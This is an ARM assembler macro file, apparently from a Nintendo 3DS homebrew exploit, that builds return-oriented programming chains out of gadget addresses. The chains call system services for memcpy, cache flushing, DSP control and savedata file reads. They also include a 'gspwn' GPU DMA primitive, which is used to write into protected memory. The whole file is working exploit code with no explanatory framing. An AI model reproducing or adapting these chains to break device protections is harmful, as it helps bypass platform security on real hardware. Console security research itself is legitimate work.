.macro set_lr,_lr
    .word V_ROP_POP_R1PC ; pop {r1, pc}
        .word V_ROP_NOP ; pop {pc}
    .word V_ROP_POP_R4LR_BX_R1 ; pop {r4, lr} ; bx r1
        .word 0xDEADBABE ; r4 (garbage)
        .word _lr ; lr
.endmacro

.macro svcSleepThread,nanosec_low,nanosec_high
    set_lr V_ROP_NOP
    .word V_ROP_POP_R0PC ; pop {r0, pc}
        .word nanosec_low ; r0
    .word V_ROP_POP_R1PC ; pop {r1, pc}
        .word nanosec_high ; r1
    .word V_SVC_SLEEPTHREAD
.endmacro

.macro memcpy,dst,src,size
    set_lr V_ROP_NOP
    .word V_ROP_POP_R0PC ; pop {r0, pc}
        .word dst ; r0
    .word V_ROP_POP_R1PC ; pop {r1, pc}
        .word src ; r1
    .word V_ROP_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
        .word size ; r2 (addr)
        .word 0xDEADBABE ; r3 (garbage)
        .word 0xDEADBABE ; r4 (garbage)
        .word 0xDEADBABE ; r5 (garbage)
        .word 0xDEADBABE ; r6 (garbage)
    .word V_MEMCPY
.endmacro

.macro flush_dcache,addr,size
    set_lr V_ROP_NOP
    .word V_ROP_POP_R0PC ; pop {r0, pc}
        .word V_GSPGPU_HANDLE ; r0 (handle ptr)
    .word V_ROP_POP_R1PC ; pop {r1, pc}
        .word 0xFFFF8001 ; r1 (process handle)
    .word V_ROP_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
        .word addr ; r2 (addr)
        .word size ; r3 (src)
        .word 0xDEADBABE ; r4 (garbage)
        .word 0xDEADBABE ; r5 (garbage)
        .word 0xDEADBABE ; r6 (garbage)
    .word V_GSPGPU_FLUSHDATACACHE
.endmacro

.macro gspwn,dst,src,size
    set_lr V_ROP_POP_R4R5R6R7R8R9R10R11PC
    .word V_ROP_POP_R0PC ; pop {r0, pc}
        .word V_GSPGPU_INTERRUPT_RECEIVER_STRUCT + 0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
    .word V_ROP_POP_R1PC ; pop {r1, pc}
        .word @@gxCommandPayload ; r1 (cmd addr)
    .word V_GSPGPU_GXTRYENQUEUE
        @@gxCommandPayload:
        .word 0x00000004 ; command header (SetTextureCopy)
        .word src ; source address
        .word dst ; destination address (standin, will be filled in)
        .word size ; size
        .word 0xFFFFFFFF ; dim in
        .word 0xFFFFFFFF ; dim out
        .word 0x00000008 ; flags
        .word 0x00000000 ; unused
.endmacro

.macro DSPDSP_UnloadComponent
    set_lr V_ROP_NOP
    .word V_ROP_POP_R0PC ; pop {r0, pc}
        .word V_DSPDSP_HANDLE ; r0 (handle ptr)
    .word V_DSPDSP_UNLOADCOMPONENT
.endmacro

.macro DSPDSP_RegisterInterruptEvents,handle,interrupt,channel
    set_lr V_ROP_NOP
    .word V_ROP_POP_R0PC ; pop {r0, pc}
        .word V_DSPDSP_HANDLE ; r0 (handle ptr)
    .word V_ROP_POP_R1PC ; pop {r1, pc}
        .word handle ; r1 (handle ptr)
    .word V_ROP_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
        .word interrupt ; r2
        .word channel ; r3
        .word 0xFFFFFFFF ; r4 (garbage)
        .word 0xFFFFFFFF ; r5 (garbage)
        .word 0xFFFFFFFF ; r6 (garbage)
    .word V_DSPDSP_REGISTERINTERRUPTEVENTS
.endmacro

ARCHIVE_SAVEDATA equ 0x4
PATH_EMPTY equ 0x1
PATH_ASCII equ 0x3
FS_OPEN_READ equ 0x1

.macro FSUSER_OpenFileDirectly,fileHandle,transaction,archiveId,archivePathType,archivePath,archivePathLength,filePathType,filePath,filePathLength,openflags,attributes
    set_lr filePathLength
    .word V_ROP_POP_R0PC
        .word V_FSUSER_HANDLE        
    
    .word V_ROP_POP_R1PC
        .word attributes
    
    .word V_ROP_POP_R2R3R4R5R6PC
        .word transaction
        .word archiveId
        .word 0xF00FF00F
        .word 0xF00FF00F
        .word 0xF00FF00F
        
    .word V_ROP_POP_R4R5R6R7R8R9R10R11R12PC
        .word 0xF00FF00F        ;r4
        .word 0xF00FF00F        ;r5
        .word 0xF00FF00F        ;r6
        .word archivePathType   ;r7
        .word archivePath       ;r8
        .word filePathType      ;r9
        .word filePath         ;r10
        .word openflags        ;r11
        .word archivePathLength ;r12

    .word V_FSUSER_OPENFILEDIRECTLY+0x24
        .word 0xF00FF00F
        .word fileHandle
        .word 0xF00FF00F
        .word 0xF00FF00F
        .word 0xF00FF00F
        .word 0xF00FF00F
        .word 0xF00FF00F
        .word 0xF00FF00F
        .word 0xF00FF00F
        .word 0xF00FF00F
        .word 0xF00FF00F
        .word 0xF00FF00F
        .word 0xF00FF00F
.endmacro

.macro FSFILE_GetSize,filehandle,size_out
    set_lr V_ROP_NOP
    .word V_ROP_POP_R0PC
        .word filehandle
    .word V_ROP_POP_R1PC
        .word size_out
    .word V_FSFILE_GETSIZE
.endmacro

.macro FSFILE_Read,filehandle,bytesread,offset_l,offset_h,buffer,size_ptr
    ; dereference the size
    .word V_ROP_POP_R0PC
        .word size_ptr
    .word V_ROP_LDR_R0R0_POP_R4PC
        .word 0xF00FF00F
    .word V_ROP_POP_R1PC
        .word @@readfile_size
    .word V_ROP_STR_R0R1_POP_R4PC
        .word 0xF00FF00F

    .word V_ROP_POP_R0PC
        .word filehandle
    .word V_ROP_POP_R1PC
@@readfile_size:    
        .word 0xF00FF00F ;to be overwritten
    .word V_ROP_POP_R2R3R4R5R6PC
        .word offset_l
        .word offset_h
        .word 0xF00FF00F
        .word bytesread
        .word buffer
    .word V_FSFILE_READ+0x10
        .word 0xF00FF00F
        .word 0xF00FF00F
        .word 0xF00FF00F
.endmacro
        
.macro FSFILE_Close,filehandle
    set_lr V_ROP_NOP
    .word V_ROP_POP_R0PC
        .word filehandle
    .word V_FSFILE_CLOSE
.endmacro        
